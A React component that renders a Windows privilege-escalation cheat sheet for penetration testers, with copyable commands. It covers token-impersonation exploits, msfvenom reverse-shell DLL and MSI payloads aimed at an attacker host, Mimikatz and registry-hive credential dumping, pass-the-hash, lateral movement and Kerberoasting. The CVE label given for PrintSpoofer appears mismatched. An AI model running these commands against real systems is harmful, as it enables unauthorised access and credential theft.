import { useState } from 'react';
import { motion } from 'framer-motion';
import { FaChevronDown, FaTerminal, FaInfoCircle } from 'react-icons/fa';
import ReactMarkdown from 'react-markdown';
import { copyToClipboard } from '../../utils/copyToClipboard';
import { toast } from 'react-toastify';

const WindowsPrivEsc = () => {
  const [expandedSection, setExpandedSection] = useState('enumeration');

  const toggleSection = (section) => {
    setExpandedSection(expandedSection === section ? null : section);
  };

  const handleCopy = (command) => {
    copyToClipboard(command);
    toast.success('Command copied to clipboard!');
  };

  const sections = [
    {
      id: 'enumeration',
      title: 'System Enumeration',
      content: [
        {
          type: 'command',
          value: 'systeminfo',
          description: 'Detailed system information'
        },
        {
          type: 'command',
          value: 'whoami /priv',
          description: 'Current user privileges'
        },
        {
          type: 'command',
          value: 'net user',
          description: 'List all users'
        },
        {
          type: 'markdown',
          value: `### Advanced Enumeration
- **Processes**: \`tasklist /svc\` (Running processes with services)
- **Network**: \`netstat -ano\` (Listening ports with PIDs)
- **Services**: \`sc query state= all\` (All services)
- **Scheduled Tasks**: \`schtasks /query /fo LIST /v\`
- **Installed Software**: \`wmic product get name,version\`
- **Patch Level**: \`wmic qfe get Caption,Description,HotFixID,InstalledOn\`
- **Unquoted Paths**: \`wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """\``
        }
      ]
    },
    {
      id: 'exploitation',
      title: 'Exploitation Techniques',
      content: [
        {
          type: 'markdown',
          value: `### Token Impersonation
\`\`\`powershell
# Check for SeImpersonatePrivilege
whoami /priv | findstr /i "Impersonate"
# RoguePotato exploit
.\RoguePotato.exe -r <attacker_ip> -e "C:\Windows\System32\cmd.exe" -l 9999
\`\`\``
        },
        {
          type: 'markdown',
          value: `### DLL Hijacking
\`\`\`powershell
# Find missing DLLs
procmon.exe (Filter: Result is NAME NOT FOUND)
# Create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f dll -o hijack.dll
\`\`\``
        },
        {
          type: 'markdown',
          value: `### PrintSpoofer (CVE-2020-1337)
\`\`\`powershell
.\PrintSpoofer.exe -c "cmd /c net localgroup administrators <user> /add"
\`\`\``
        },
        {
          type: 'markdown',
          value: `### AlwaysInstallElevated
\`\`\`powershell
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f msi -o setup.msi
msiexec /quiet /qn /i setup.msi
\`\`\``
        }
      ]
    },
    {
      id: 'post-exploitation',
      title: 'Post-Exploitation',
      content: [
        {
          type: 'markdown',
          value: `### Credential Dumping
\`\`\`powershell
# Mimikatz
sekurlsa::logonpasswords
# SAM database
reg save HKLM\\SAM sam.save
reg save HKLM\\SYSTEM system.save
# LSA secrets
reg save HKLM\\SECURITY security.save
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Lateral Movement
\`\`\`powershell
# WMI
wmic /node:<target> process call create "cmd /c <command>"
# PowerShell Remoting
Invoke-Command -ComputerName <target> -ScriptBlock { <commands> }
# Pass-the-Hash
.\pth-winexe -U <user>%<hash> //<target> cmd
\`\`\``
        }
      ]
    },
    {
      id: 'active-directory',
      title: 'Active Directory',
      content: [
        {
          type: 'markdown',
          value: `### Enumeration
\`\`\`powershell
# Basic domain info
net config workstation
# Users
net user /domain
# Groups
net group /domain
# Computers
net group "Domain Computers" /domain
# BloodHound collector
SharpHound.exe -c All
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Kerberos Attacks
\`\`\`powershell
# AS-REP Roasting
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname
# Kerberoasting
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql01.domain.com"
\`\`\``
        }
      ]
    }
  ];

  return (
    <div className="cheatsheet-container">
      <h2 className="cheatsheet-title">
        <FaTerminal /> Windows Privilege Escalation Cheat Sheet
      </h2>
      
      <div className="info-banner">
        <FaInfoCircle />
        <p>
          Comprehensive Windows privilege escalation techniques covering local and 
          Active Directory environments with modern exploitation methods.
        </p>
      </div>
      
      <div className="sections-container">
        {sections.map((section) => (
          <div key={section.id} className="section">
            <motion.div
              className="section-header"
              onClick={() => toggleSection(section.id)}
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
            >
              <h3>{section.title}</h3>
              <motion.div
                animate={{ rotate: expandedSection === section.id ? 180 : 0 }}
              >
                <FaChevronDown />
              </motion.div>
            </motion.div>
            
            <motion.div
              className="section-content"
              initial={{ opacity: 0, height: 0 }}
              animate={{
                opacity: expandedSection === section.id ? 1 : 0,
                height: expandedSection === section.id ? 'auto' : 0
              }}
              transition={{ duration: 0.3 }}
            >
              {expandedSection === section.id && (
                <div className="content-inner">
                  {section.content.map((item, index) => (
                    <div key={index} className="content-item">
                      {item.type === 'command' ? (
                        <div className="command-item">
                          <div className="command-header">
                            <code>{item.value}</code>
                            <button
                              onClick={() => handleCopy(item.value)}
                              className="copy-button small"
                            >
                              Copy
                            </button>
                          </div>
                          <p className="command-description">{item.description}</p>
                        </div>
                      ) : (
                        <div className="markdown-content">
                          <ReactMarkdown>
                            {item.value}
                          </ReactMarkdown>
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              )}
            </motion.div>
          </div>
        ))}
      </div>
    </div>
  );
};

export default WindowsPrivEsc;